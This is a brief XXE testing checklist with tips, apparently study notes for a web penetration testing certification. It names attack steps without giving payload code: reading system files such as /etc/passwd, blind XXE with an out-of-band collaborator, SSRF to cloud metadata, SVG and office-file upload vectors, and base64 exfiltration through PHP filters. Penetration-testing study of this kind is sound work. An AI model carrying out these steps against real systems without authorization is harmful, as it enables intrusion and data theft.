## 📋 XXE Testing Checklist

- [ ] Change Content-Type to `application/xml`
- [ ] Try basic file read (`/etc/passwd`, `/etc/hostname`)
- [ ] Test blind XXE with Burp Collaborator
- [ ] Try SSRF via XXE (cloud metadata)
- [ ] Test SVG file upload
- [ ] Test DOCX/XLSX file upload
- [ ] Try XInclude if DOCTYPE not allowed
- [ ] Test PHP filter for base64 exfiltration
- [ ] Check SOAP endpoints
- [ ] Test JSON endpoints (change to XML)

---

## 🧠 eWPTXv3 Tips

- Try **changing Content-Type** from JSON to XML — many APIs accept both
- **PHP filter** trick helps when output is filtered/sanitized
- **Blind XXE** is more common — always use Burp Collaborator
- Look for XML in **SOAP endpoints** — often forgotten
- **SVG upload** is a very common XXE vector
- XInclude works when DOCTYPE is **blocked**

